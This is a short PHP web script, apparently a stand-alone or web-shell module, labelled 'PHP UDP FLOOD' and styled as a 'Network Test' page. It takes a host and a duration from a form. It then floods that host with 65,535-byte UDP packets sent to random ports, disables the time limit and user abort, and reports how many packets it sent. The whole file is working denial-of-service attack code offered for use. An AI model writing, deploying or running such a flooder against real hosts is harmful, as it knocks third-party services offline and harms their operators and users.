<?php
if(isset($_GET['host'])&&isset($_GET['time']))
{
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $exec_time = $_GET['time'];
    $time = time();
    $max_time = $time + $exec_time;
    $host = $_GET['host'];

    for($i=0;$i<65535;$i++)
		{
			$out .= 'X';
		}
    while(1)
		{
			$packets++;
			if(time() > $max_time)
		{
       break;
    }
    $rand = rand(1,65535);
    $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
    if($fp){
  fwrite($fp, $out);
  fclose($fp);
    }
    }
	echo 
	"<p>You've attacked <b>$host</b> with <b>$packets</b> packets per second during <b>$exec_time</b> seconds<p>
	 	<form action=''.$surl.'' method='GET'>
	 		<input type='hidden' name='act' value='phptools'>
    		<input type='text' name='host' placeholder='Enter host'>
    		<input type='text' name='time' placeholder='Enter time'>
    		<input type='submit' value=Send>
	 	</form>";
}
	else
{ 
	echo 
	'<p>Hey, Welcome to <b>PHP UDP FLOOD</b> page:</p>
    
	 	<form action="'.$surl.'" method="GET">
	 		<input type="hidden" name="act" value="phptools">
    		<input type="text" name="host" placeholder="Enter host">
    		<input type="text" name="time" placeholder="Enter time">
    		<input type="submit" value=Send>
	 	</form>';
}
?>
<html>
<head>
    <meta charset="utf-8">
    <title>Network Test - PHP Flood Script</title>
    <meta name="description" content="Welcome to this page, you can test an address around the world.">
    <meta name="author" content="elninocrazy.net">
    <meta name="date" content="22-07-2015">
</head>
<style>
input
{
  font-size: 8pt;
  color: rgb(39, 32, 32);
}
button
{
background-color: #00FF00; font-size: 8pt; color: black; font-family: Tahoma; border: 1 solid #66;
}
body 
{
background-color: rgba(167, 205, 181, 0.06);
}
</style>
<body>
</body>
</html>
